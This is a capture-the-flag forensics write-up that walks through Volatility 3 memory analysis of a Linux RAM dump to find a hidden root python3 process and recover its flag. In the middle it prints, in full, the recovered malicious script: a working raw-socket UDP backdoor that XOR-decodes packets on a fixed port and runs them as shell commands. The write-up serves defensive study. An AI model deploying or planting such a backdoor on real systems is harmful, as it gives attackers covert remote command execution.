@@ -1,0 +1,135 @@
+Volatile Incident - Instance of a Program: Writeup
+Challenge Overview
+
+    Category: Forensics
+    Points: 496
+    Task: Analyze a RAM snapshot to find suspicious processes.
+
+Step 1: Building the Symbol Table
+
+Since Volatility 3 requires kernel symbols to analyze Linux memory dumps, we first needed to build the symbol table for kernel 5.14.0-691.el9.x86_64 (RHEL 9 / CentOS Stream 9):
+bash
+
+# Clone and build dwarf2json
+git clone https://github.com/volatilityfoundation/dwarf2json
+cd dwarf2json && go build
+
+# Download kernel debuginfo RPM
+wget https://kojihub.stream.centos.org/kojifiles/packages/kernel/5.14.0/691.el9/x86_64/kernel-debuginfo-5.14.0-691.el9.x86_64.rpm
+
+# Extract the RPM
+rpm2cpio kernel-debuginfo-5.14.0-691.el9.x86_64.rpm | cpio -idmv
+
+# Build the symbol JSON
+./dwarf2json linux --elf ~/usr/lib/debug/lib/modules/5.14.0-691.el9.x86_64/vmlinux > linux-5.14.0-691.el9.x86_64.json
+
+# Place it for Volatility
+mkdir -p /home/kali/.local/lib/python3.13/site-packages/volatility3/symbols/linux/
+cp linux-5.14.0-691.el9.x86_64.json /home/kali/.local/lib/python3.13/site-packages/volatility3/symbols/linux/
+
+Step 2: Listing Processes
+
+With symbols in place, we ran linux.pslist:
+bash
+
+vol -f dump.mem linux.pslist
+
+Scanning through the output, one process immediately stood out:
+
+8235    1    python3    UID:0    2026-04-16 19:01:49
+
+Suspicious because:
+
+    Running as root (UID 0)
+    Spawned directly from systemd (PID 1) — unusual for a user process
+    Started long after system boot
+
+Step 3: Investigating the Process
+
+We checked the full command line using linux.psaux:
+bash
+
+vol -f dump.mem linux.psaux | grep python
+
+Output:
+
+8235    1    python3    nohup python3 .bash &
+
+Red flags:
+
+    Script named .bash (hidden dotfile masquerading as a shell config)
+    Running with nohup in the background for persistence
+    Executed via SSH from 192.168.100.51
+
+Step 4: Checking Network Activity
+bash
+
+vol -f dump.mem linux.sockstat | grep 8235
+
+Output:
+
+AF_PACKET    RAW    ETH_P_ALL    ANY    UNCONNECTED
+
+This confirmed the script was sniffing all raw network traffic.
+Step 5: Recovering the Script
+
+We extracted the script content directly from memory:
+bash
+
+strings dump.mem | grep -A 30 "import socket"
+
+This revealed the full malicious script:
+python
+
+import socket, struct, os
+P, K = 47291, "5fg6r48v3aes5"
+F = bytes([102, 45, 74, 117, 55, 102, 108, 13, 67, 24, 82, 27, 5, 91, 57, 
+           4, 2, 0, 66, 9, 24, 84, 62, 84, 70, 106, 1, 10, 82, 6, 45, 7, 12, 67, 74, 28])
+
+def stealth_executor():
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+    while True:
+        f, _ = s.recvfrom(65535)
+        p = f[14:]
+        if len(p) < 20 or (p[0] >> 4) != 4 or p[9] != 17: continue
+        hl = (p[0] & 0x0F) * 4
+        h = struct.unpack('!HHHH', p[hl:hl+8])
+        if h[1] == P:
+            d = p[hl+8 : hl+h[2]]
+            c = "".join(chr(d[i] ^ ord(K[i % len(K)])) for i in range(len(d))).strip()
+            os.popen(c)
+
+if __name__ == "__main__":
+    stealth_executor()
+
+Step 6: Analyzing the Malware
+
+The script is a UDP backdoor / packet sniffer:
+
+    Opens a raw socket listening on all network traffic
+    Filters for UDP packets on port 47291
+    XOR decrypts the payload using key "5fg6r48v3aes5"
+    Executes the decrypted content as a system command via os.popen()
+
+The F bytes array embedded in the script looked like encoded data. We decoded it using the same XOR key:
+python
+
+python3 -c "
+F = bytes([102, 45, 74, 117, 55, 102, 108, 13, 67, 24, 82, 27, 5, 91, 57, 
+           4, 2, 0, 66, 9, 24, 84, 62, 84, 70, 106, 1, 10, 82, 6, 45, 7, 12, 67, 74, 28])
+K = '5fg6r48v3aes5'
+print(''.join(chr(F[i] ^ ord(K[i % len(K)])) for i in range(len(F))))
+"
+
+Flag
+
+SK-CERT{py7h0n_c4rv1ng_15_4l50_345y}
+
+Key Takeaways
+
+    Always check for processes running as root spawned directly from systemd
+    Hidden dotfiles like .bash are a classic attacker trick to blend in
+    Raw socket usage (AF_PACKET) is a major red flag — legitimate user programs rarely need this
+    Memory carving (strings + pattern matching) can recover full malicious scripts from RAM dumps without needing to mount the filesystem
+    XOR encryption with a hardcoded key is a common but weak obfuscation technique used by malware
+
